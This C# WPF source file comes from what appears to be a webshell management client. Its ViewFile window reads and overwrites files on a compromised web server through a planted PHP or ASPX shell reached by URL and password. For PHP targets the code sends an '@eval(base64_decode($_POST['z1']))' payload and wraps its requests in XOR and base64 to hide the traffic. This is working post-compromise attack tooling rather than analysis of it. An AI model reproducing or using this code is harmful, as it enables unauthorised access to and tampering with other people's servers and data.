using System.Windows;
using WpfApp1.Utli;
using WpfApp1.Payload.php;
using System.Collections.Generic;
using WpfApp1.Payload.aspx;
using WpfApp1.Payload.php.xor;

namespace WpfApp1.UI
{
    /// <summary>
    /// ViewFile.xaml 的交互逻辑
    /// </summary>
    public partial class ViewFile : Window
    {
        /// <summary>
        /// 引入base64加密
        /// </summary>
        encrypt encrypt = new encrypt();

        /// <summary>
        /// 引入post http请求
        /// </summary>
        Post post = new Post();

        /// <summary>
        /// 引入payload
        /// </summary>
        Controller payload = new Controller();
        Base Base = new Base();
        FileOut filePayload = new FileOut();

        /// <summary>
        /// 文件名路径
        /// </summary>
        public string getPath { get; set; }
        /// <summary>
        /// 文件webshell
        /// </summary>
        public string getUrl { get; set; }
        /// <summary>
        /// shell 密码
        /// </summary>
        public string getPwd { get; set; }
        /// <summary>
        /// 脚本类型
        /// </summary>
        public string getScript { get; set; }
        public ViewFile()
        {
            InitializeComponent();
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            if(getScript == "php")
            {
                //string z1 = "@eval(base64_decode($_POST['z1']));";

                textBlock.Text = getPath;
                string BasePath = encrypt.EncodeBase64("utf-8", getPath);
                // string p = z1 + "&z1=" + payload.ViewFile() + "&path=" + BasePath;

                string pathroot = filePayload.ViewFile(BasePath);
                string xor_base64_encrypt = Utli.xor_base64.Encrypt(pathroot);
                string resp = Utli.XorPost.Post(getUrl, xor_base64_encrypt);
                string base64_decrypt = encrypt.DecodeBase64("utf-8",resp);

                // MessageBox.Show(results);
                TextEditor.Text = base64_decrypt;
                textBlock.IsReadOnly = true;
            }
            if(getScript == "aspx")
            {
                string z1 = Base.ReadFile();
                textBlock.Text = getPath;
                string BasePath = encrypt.EncodeBase64("utf-8", getPath);
                string p = z1 + "&path=AQ" + BasePath;
                string results = Post.Postring(getUrl, new Dictionary<string, string> { { getPwd, p } });
                TextEditor.Text = results;
                textBlock.IsReadOnly = true;
            }
            
            

        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            if(getScript == "php")
            {
                string z1 = "@eval(base64_decode($_POST['z1']));";
                string BasePath = encrypt.EncodeBase64("utf-8", getPath);
                string content = encrypt.EncodeBase64("utf-8", TextEditor.Text);

                string p = z1 + "&z1=" + payload.WriteFile() + "&file=" + BasePath + "&content=" + content;

                string results = Post.Postring(getUrl, new Dictionary<string, string> { { getPwd, p } });


                if (results == "1")
                {
                    MessageBox.Show("Success");
                    this.Close();
                }
                else
                {
                    MessageBox.Show("Failed");
                }
            }
            if (getScript == "aspx")
            {
                string path = getPath + textBlock.Text;
                string z1 = Base.CreateFile();
                string BasePath = encrypt.EncodeBase64("utf-8", path);
                string content = encrypt.EncodeBase64("utf-8", TextEditor.Text);
                string p = z1 + "&path=AQ" + BasePath + "&content=AQ" + content;
                string results = Post.Postring(getUrl, new Dictionary<string, string> { { getPwd, p } });
                if (results == "1")
                {
                    MessageBox.Show("Success");
                }
                else
                {
                    MessageBox.Show(results);
                }
            }
            
        }
    }
}
